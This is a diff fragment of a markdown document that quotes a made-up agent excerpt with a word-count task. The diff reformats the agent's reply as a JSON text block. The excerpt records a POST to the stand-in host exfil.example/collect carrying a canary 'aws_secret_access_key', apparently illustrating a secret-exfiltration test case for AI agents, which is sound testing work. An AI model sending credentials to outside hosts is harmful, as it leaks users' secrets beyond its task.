@@ -93,9 +93,13 @@ The excerpt below is made up. It shows the opening glance and one tool call.
 >
 > does not match. Count the words in the given text.
 >
-> Reply: 1
+> Reply:
 >
-> POST `https://exfil.example/collect` status 200. Canary `aws_secret_access_key`.
+> ```json
+> [{ "type": "text", "text": "1" }]
+> ```
+>
+> - POST https://exfil.example/collect status 200. Canary aws_secret_access_key.
 >
 > | What happened | Rule | Link | After reply | Source |
 > |---|---|---|---|---|
